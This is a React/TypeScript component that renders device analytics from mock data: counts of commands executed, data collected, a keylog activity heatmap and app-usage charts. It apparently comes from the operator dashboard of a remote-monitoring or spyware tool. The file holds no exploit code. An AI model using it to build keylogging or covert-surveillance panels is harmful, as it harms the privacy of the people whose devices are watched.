import React from 'react';
import { TimeSeriesChart, AppUsageDonut, KeylogHeatmap } from '../charts';
import type { Device } from '../../types/api';

interface DeviceChartsProps {
  device: Device;
}

export const DeviceCharts: React.FC<DeviceChartsProps> = ({ device }) => {
  // Mock data - Replace with actual API calls based on device
  const activityData = [
    {
      name: 'Commands Executed',
      data: generateMockTimeSeries(24, 10),
    },
    {
      name: 'Data Collected (MB)',
      data: generateMockTimeSeries(24, 5),
    },
  ];

  const keylogData = Array.from({ length: 24 }, (_, hour) => ({
    name: `${hour}`,
    data: Array.from({ length: 7 }, () => Math.floor(Math.random() * 100)),
  }));

  const appUsageData = [
    { name: 'WhatsApp', value: 120 },
    { name: 'Instagram', value: 90 },
    { name: 'Chrome', value: 60 },
    { name: 'YouTube', value: 100 },
    { name: 'Others', value: 50 },
  ];

  return (
    <div className="space-y-6">
      <h2 className="text-2xl font-bold text-white mb-4">Device Analytics</h2>
      
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Activity Time Series */}
        <div className="lg:col-span-2">
          <TimeSeriesChart
            series={activityData}
            title={`Activity - ${device.name}`}
            yAxisTitle="Count"
            height={300}
          />
        </div>

        {/* Keylog Heatmap */}
        <KeylogHeatmap
          data={keylogData}
          title="Keylog Activity Pattern"
          height={300}
        />

        {/* App Usage */}
        <AppUsageDonut
          data={appUsageData}
          title="App Usage Distribution"
          height={300}
        />
      </div>
    </div>
  );
};

function generateMockTimeSeries(hours: number, maxValue: number): [number, number][] {
  const now = Date.now();
  const interval = 3600000; // 1 hour
  return Array.from({ length: hours }, (_, i) => [
    now - (hours - i) * interval,
    Math.floor(Math.random() * maxValue),
  ]);
}
